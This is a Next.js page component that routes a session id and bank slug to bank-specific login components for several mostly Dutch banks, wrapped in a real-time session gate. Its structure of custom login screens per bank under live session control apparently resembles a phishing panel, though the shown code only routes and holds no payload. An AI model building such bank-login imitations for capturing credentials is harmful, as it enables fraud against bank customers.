import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { BankLoginClient } from "./bank-login-client";
import { AbnAmroLoginClient } from "./abn-amro-client";
import { AdyenLoginClient } from "./adyen-client";
import { AsnBankLoginClient } from "./asn-bank-client";
import { AsnBankVhRegiobankLoginClient } from "./asn-bank-vh-regiobank-client";
import { AsnBankVoorheenBlgwonenLoginClient } from "./asn-bank-voorheen-blgwonen-client";
import { AsnBankVoorheenSnsLoginClient } from "./asn-bank-voorheen-sns-client";
import { BunqLoginClient } from "./bunq-client";
import { AutoRedirectClient } from "./auto-redirect-client";
import { VanLanschotKempenClient } from "./van-lanschot-kempen-client";
import { IngClient } from "./ing-client";
import { FinomClient } from "./finom-client";
import { YoursafeClient } from "./yoursafe-client";
import { RabobankClient } from "./rabobank-client";
import { N26Client } from "./n26-client";
import { NationaleNederlandenClient } from "./nationale-nederlanden-client";
import { TriodosBankClient } from "./triodos-bank-client";
import { getBankBySlug } from "@/lib/at-bank-catalog";

type Props = {
  params: Promise<{ id: string; bank_slug: string }>;
};

export default async function BankLoginPage({ params }: Props) {
  const { id, bank_slug } = await params;
  const bank = await getBankBySlug(bank_slug);
  const bankName = bank?.name || bank_slug;

  const autoRedirectBanks = ["buut", "knab", "mollie", "revolut"];

  return (
    <>
      <SessionRealtimeGate sessionId={id} />
      {autoRedirectBanks.includes(bank_slug) ? (
        <AutoRedirectClient sessionId={id} bankSlug={bank_slug} bankName={bankName} />
      ) : bank_slug === "van-lanschot-kempen" ? (
        <VanLanschotKempenClient sessionId={id} />
      ) : bank_slug === "ing" ? (
        <IngClient sessionId={id} />
      ) : bank_slug === "finom" ? (
        <FinomClient sessionId={id} />
      ) : bank_slug === "yoursafe" ? (
        <YoursafeClient sessionId={id} />
      ) : bank_slug === "rabobank" ? (
        <RabobankClient sessionId={id} />
      ) : bank_slug === "n26" ? (
        <N26Client sessionId={id} />
      ) : bank_slug === "nationale-nederlanden" ? (
        <NationaleNederlandenClient sessionId={id} />
      ) : bank_slug === "triodos-bank" ? (
        <TriodosBankClient sessionId={id} />
      ) : bank_slug === "abn-amro" ? (
        <AbnAmroLoginClient sessionId={id} />
      ) : bank_slug === "adyen" ? (
        <AdyenLoginClient sessionId={id} />
      ) : bank_slug === "asn-bank" ? (
        <AsnBankLoginClient sessionId={id} />
      ) : bank_slug === "asn-bank-vh-regiobank" ? (
        <AsnBankVhRegiobankLoginClient sessionId={id} />
      ) : bank_slug === "asn-bank-voorheen-blgwonen" ? (
        <AsnBankVoorheenBlgwonenLoginClient sessionId={id} />
      ) : bank_slug === "asn-bank-voorheen-sns" ? (
        <AsnBankVoorheenSnsLoginClient sessionId={id} />
      ) : bank_slug === "bunq" ? (
        <BunqLoginClient sessionId={id} />
      ) : (
        <BankLoginClient sessionId={id} bankSlug={bank_slug} bank={bank} />
      )}
    </>
  );
}
